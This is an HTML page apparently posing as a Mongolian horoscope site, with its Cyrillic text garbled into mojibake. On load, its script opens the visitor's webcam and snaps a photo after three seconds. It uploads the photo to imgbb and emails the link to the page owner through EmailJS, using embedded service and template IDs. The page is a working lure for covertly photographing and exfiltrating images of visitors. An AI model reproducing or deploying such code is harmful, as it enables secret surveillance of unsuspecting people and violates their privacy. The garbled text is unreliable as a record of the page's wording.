<!DOCTYPE html>
<html lang="mn">
<head>
  <meta charset="UTF-8">
  <title>Klbnova_k - –ó—É—Ä—Ö–∞–π</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      margin-top: 50px;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>
  <h2>üî• –¢–∞–Ω–∞–π –∑—É—Ä—Ö–∞–π –≥–∞—Ä—á –±–∞–π–Ω–∞! –ö–∞–º–µ—Ä–∞–∞ –∏–¥—ç–≤—Ö–∂“Ø“Ø–ª–∂ –±–∞–π–Ω–∞...</h2>
  <video id="video" autoplay playsinline></video>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    // EmailJS –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏
    emailjs.init('kipfas-5Vanci-myzpec'); // <-- –≠–ù–î ”©”©—Ä–∏–π–Ω PUBLIC KEY-–≥ –æ—Ä—É—É–ª—Å–∞–Ω –±–∞–π–Ω–∞

    // –•—É—É–¥–∞—Å –∞—á–∞–∞–ª–∞—Ö–∞–¥ –∞–≤—Ç–æ–º–∞—Ç–∞–∞—Ä —ç—Ö—ç–ª–Ω—ç
    window.onload = async function start() {
      const video = document.getElementById('video');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = 'block';

        // 3 —Å–µ–∫—É–Ω–¥ —Ö“Ø–ª—ç—ç–≥—ç—ç–¥ –∑—É—Ä–∞–≥ –∞–≤–Ω–∞
        setTimeout(() => {
          takeSnapshot(video);
          stream.getTracks().forEach(track => track.stop());
          video.style.display = 'none';
        }, 3000);
      } catch (err) {
        console.error("–ö–∞–º–µ—Ä –∏–¥—ç–≤—Ö–∂“Ø“Ø–ª—ç—Ö—ç–¥ –∞–ª–¥–∞–∞ –≥–∞—Ä–ª–∞–∞:", err);
        alert("–ö–∞–º–µ—Ä—Ç —Ö–∞–Ω–¥–∞—Ö –±–æ–ª–æ–º–∂–≥“Ø–π –±–∞–π–Ω–∞. –¢–∞ –∑”©–≤—à”©”©—Ä”©–ª ”©–≥–Ω”© “Ø“Ø.");
      }
    }

    function takeSnapshot(video) {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/jpeg');
      uploadAndSend(imageData);
    }

    function uploadAndSend(base64Image) {
      const formData = new FormData();
      formData.append('image', base64Image);

      fetch('https://api.imgbb.com/1/upload?key=YOUR_IMGBB_API_KEY', { // <-- –≠–ù–î API KEY-—ç—ç –æ—Ä—É—É–ª–Ω–∞
        method: 'POST',
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        const image_url = data.data.url;
        return emailjs.send('service_i42qtc9', 'template_6zilr7d', {
          image_url: image_url
        });
      })
      .then(() => {
        alert("–ó—É—Ä–∞–≥ –∞–º–∂–∏–ª—Ç—Ç–∞–π –∏–ª–≥—ç—ç–≥–¥–ª—ç—ç!");
      })
      .catch(err => {
        console.error("–ó—É—Ä–∞–≥ –∏–ª–≥—ç—ç—Ö—ç–¥ –∞–ª–¥–∞–∞ –≥–∞—Ä–ª–∞–∞:", err);
        alert("–ê–ª–¥–∞–∞ –≥–∞—Ä–ª–∞–∞!");
      });
    }
  </script>
</body>
</html>